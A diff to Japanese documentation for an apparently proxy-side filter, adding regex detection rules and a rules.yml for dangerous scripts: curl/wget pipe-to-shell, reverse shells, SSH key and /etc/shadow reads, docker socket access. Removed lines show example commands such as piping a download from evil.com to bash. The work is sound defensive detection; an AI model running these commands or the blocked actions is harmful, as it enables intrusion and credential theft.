@@ -41,54 +41,98 @@ deb.nodesource.com
 
 レスポンスボディ内で検出する危険なスクリプトパターン。マッチした場合はリクエストがブロックされる。
 
-| Pattern | Description | Example |
+| Pattern | Severity | Description |
 |---|---|---|
-| `curl\s+.*\|\s*(ba)?sh` | curl 出力のシェルへのパイプ | `curl https://evil.com/x \| bash` |
-| `wget\s+.*\|\s*(ba)?sh` | wget 出力のシェルへのパイプ | `wget -O- url \| sh` |
-| `curl.*-o\s*/tmp/.*&&.*sh\s+/tmp/` | ダウンロード + 実行 | `curl -o /tmp/x url && sh /tmp/x` |
-| `base64\s+(-d\|--decode).*\|\s*(ba)?sh` | Base64 デコード + 実行 | `base64 -d <<< "..." \| sh` |
-| `eval\s+"\$\(curl` | eval によるリモートコード実行 | `eval "$(curl -s url)"` |
-| `python[23]?\s+-c\s+.*urllib` | Python ワンライナーでのダウンロード実行 | `python3 -c "import urllib..."` |
-| `perl\s+-e\s+.*socket` | Perl によるリバースシェル | `perl -e 'use Socket;...'` |
+| `curl\s+.*\|\s*(ba)?sh` | critical | curl 出力のシェルへのパイプ |
+| `wget\s+.*\|\s*(ba)?sh` | critical | wget 出力のシェルへのパイプ |
+| `curl.*-o\s*/tmp/.*&&.*sh\s+/tmp/` | high | ダウンロード + 実行 |
+| `base64\s+(-d\|--decode).*\|\s*(ba)?sh` | critical | Base64 デコード + 実行 |
+| `eval\s+"\$\(curl` | critical | eval によるリモートコード実行 |
+| `python[23]?\s+-c\s+.*urllib` | medium | Python ワンライナーでのダウンロード |
+| `perl\s+-e\s+.*socket` | high | Perl リバースシェル |
+| `(nc\|ncat\|netcat)\s+.*-e\s+/bin/(ba)?sh` | critical | Netcat リバースシェル |
+| `bash\s+-i\s+>&\s+/dev/tcp/` | critical | Bash /dev/tcp リバースシェル |
+| `python[23]?\s+-c\s+.*socket.*connect` | critical | Python socket リバースシェル |
+| `nmap\s+(-[a-zA-Z]+\s+)*[\d\.]+` | high | nmap ネットワークスキャン |
+| `/var/run/docker\.sock` | critical | Docker ソケットアクセス |
+| `echo\s+.*>\s*/proc/` | critical | /proc ファイルシステムへの書き込み |
+| `cat\s+/etc/(passwd\|shadow)` | high | システム認証情報ファイルの読み取り |
+| `crontab\s\|/etc/cron` | high | crontab 操作 |
+| `cat\s+.*\.ssh/(id_rsa\|id_ed25519\|authorized_keys)` | critical | SSH 鍵アクセス |
 
 **ルールファイル形式:** `rules.yml`
 
 ```yaml
 dangerous_patterns:
+  # Remote code execution
   - name: curl_pipe_bash
     pattern: 'curl\s+.*\|\s*(ba)?sh'
     severity: critical
     description: "Piping curl output directly to shell"
-
   - name: wget_pipe_sh
     pattern: 'wget\s+.*\|\s*(ba)?sh'
     severity: critical
     description: "Piping wget output directly to shell"
-
   - name: base64_decode_exec
     pattern: 'base64\s+(-d|--decode).*\|\s*(ba)?sh'
     severity: critical
     description: "Decoding base64 and executing in shell"
-
   - name: eval_curl
     pattern: 'eval\s+"\$\(curl'
     severity: critical
     description: "Eval with remote code download"
-
   - name: download_and_exec
     pattern: 'curl.*-o\s+/tmp/.*&&.*sh\s+/tmp/'
     severity: high
     description: "Download to temp and execute"
-
   - name: python_urllib_exec
     pattern: 'python[23]?\s+-c\s+.*urllib'
     severity: medium
     description: "Python one-liner with urllib"
 
+  # Reverse shells
   - name: perl_reverse_shell
     pattern: 'perl\s+-e\s+.*socket'
     severity: high
     description: "Perl reverse shell pattern"
+  - name: netcat_reverse_shell
+    pattern: '(nc|ncat|netcat)\s+.*-e\s+/bin/(ba)?sh'
+    severity: critical
+    description: "Netcat reverse shell"
+  - name: bash_reverse_shell
+    pattern: 'bash\s+-i\s+>&\s+/dev/tcp/'
+    severity: critical
+    description: "Bash /dev/tcp reverse shell"
+  - name: python_reverse_shell
+    pattern: 'python[23]?\s+-c\s+.*socket.*connect'
+    severity: critical
+    description: "Python reverse shell via socket"
+
+  # Reconnaissance & host attacks
+  - name: nmap_scan
+    pattern: 'nmap\s+(-[a-zA-Z]+\s+)*[\d\.]+'
+    severity: high
+    description: "Network scanning with nmap"
+  - name: docker_socket_access
+    pattern: '/var/run/docker\.sock'
+    severity: critical
+    description: "Docker socket access attempt"
+  - name: proc_sys_write
+    pattern: 'echo\s+.*>\s*/proc/'
+    severity: critical
+    description: "Writing to /proc filesystem"
+  - name: etc_passwd_shadow
+    pattern: 'cat\s+/etc/(passwd|shadow)'
+    severity: high
+    description: "Reading system credential files"
+  - name: crontab_injection
+    pattern: 'crontab\s|/etc/cron'
+    severity: high
+    description: "Crontab modification attempt"
+  - name: ssh_key_exfil
+    pattern: 'cat\s+.*\.ssh/(id_rsa|id_ed25519|authorized_keys)'
+    severity: critical
+    description: "SSH key access attempt"
 ```
 
 ### 3. C2 IP Blocklist
